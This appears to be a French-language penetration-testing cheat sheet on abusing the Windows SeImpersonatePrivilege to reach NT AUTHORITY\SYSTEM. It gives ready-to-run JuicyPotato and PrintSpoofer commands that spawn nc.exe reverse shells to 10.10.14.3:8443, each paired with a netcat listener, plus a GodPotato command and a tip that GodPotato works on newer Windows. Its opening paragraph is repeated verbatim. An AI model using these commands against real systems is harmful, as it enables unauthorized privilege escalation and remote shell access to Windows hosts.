### Qu'est-ce que le droit "SeImpersonatePrivilege" ?

Ce privilège permet à un processus d'adopter l'identité d'un autre utilisateur. Il est souvent utilisé en conjonction avec des services Windows qui doivent s'exécuter avec des niveaux de privilèges élevés. Un utilisateur avec ce privilège peut potentiellement élever ses droits à `NT AUTHORITY\SYSTEM`, qui est le niveau de privilège le plus élevé sur un système Windows.


Ce privilège permet à un processus d'adopter l'identité d'un autre utilisateur. Il est souvent utilisé en conjonction avec des services Windows qui doivent s'exécuter avec des niveaux de privilèges élevés. Un utilisateur avec ce privilège peut potentiellement élever ses droits à `NT AUTHORITY\SYSTEM`, qui est le niveau de privilège le plus élevé sur un système Windows.

---
### Utilisation de JuicyPotato.exe

JuicyPotato est un outil qui peut abuser de ce privilège pour exécuter un code arbitraire avec des privilèges élevés. Notez que cet outil ne fonctionne pas à partir de Windows Server 2019/Windows 10 à cause des améliorations de sécurité.

```powershell
JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```

```bash
nc -lnvp 8443  # Ecoute sur le port 8443 pour une connexion entrante`
```

---
### Utilisation de PrintSpoofer.exe

PrintSpoofer est une autre technique qui abuse du privilège `SeImpersonatePrivilege` pour élever des privilèges :

```powershell
PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

```bash
nc -lnvp 8443  # Ecoute sur le port 8443 pour une connexion entrante`
```

---
### Utilisation de GodPotato.exe

GodPotato est encore une autre patate qui abuse du privilège `SeImpersonatePrivilege` pour élever des privilèges :

```powershell
GodPotato -cmd "cmd /c whoami"
```

> [!Astuce]
> GodPotato est à privilégier, il s'agit du plus simple et est compatible avec Windows Server 2019/Windows 10 !

